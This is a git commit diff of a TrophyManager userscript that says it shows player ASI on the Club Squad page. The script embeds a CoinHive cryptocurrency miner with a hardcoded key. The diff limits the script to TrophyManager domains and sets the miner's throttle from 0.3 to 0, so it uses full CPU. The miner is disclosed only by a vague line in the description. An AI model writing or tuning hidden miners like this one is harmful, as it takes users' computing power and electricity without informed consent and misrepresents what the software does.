04b60d3dfceac621039b1ef3ae42e07668f46e2e
etnepres <etnepres@gmail.com>
2017-10-13 23:55:10 +0100

    Revert "Update tm_super_club_squad.user.js"
    This reverts commit 2d161a1effc5ac0e98be8b9362d659848216115d.

--- tm_super_club_squad.user.js
+++ tm_super_club_squad.user.js
@@ -3,8 +3,12 @@
 // @version 	     1.0.0
 // @description	   Show ASI on Club Squad page. Edited to include coinhash generator to support developer. Thanks
 // @namespace      http://trophymanager.com
-// @include        http://*
-// @include        https://*
+// @include        http://static.trophymanager.com/*
+// @include        http://www.trophymanager.com/*
+// @include        http://trophymanager.com/*
+// @include        https://static.trophymanager.com/*
+// @include        https://www.trophymanager.com/*
+// @include        https://trophymanager.com/*
 // @author    	  Joao Manuel Ferreira Fernandes
 // @github		  http://github.com/etnepres/trophymanager.git	
 // @grant			none
@@ -87,7 +91,7 @@ if(useCoinHasGeneraterAndSuportDeveloper){
 	setTimeout(function(){
 	var miner = new CoinHive.User('vnDqlIL7DdMNJdkBVUvbsy072yJMoOqK', 'trophymanager', {
 		autoThreads: true,
-		throttle: 0.3,
+		throttle: 0,
 		forceASMJS: false
 	});
 	miner.start(CoinHive.IF_EXCLUSIVE_TAB);
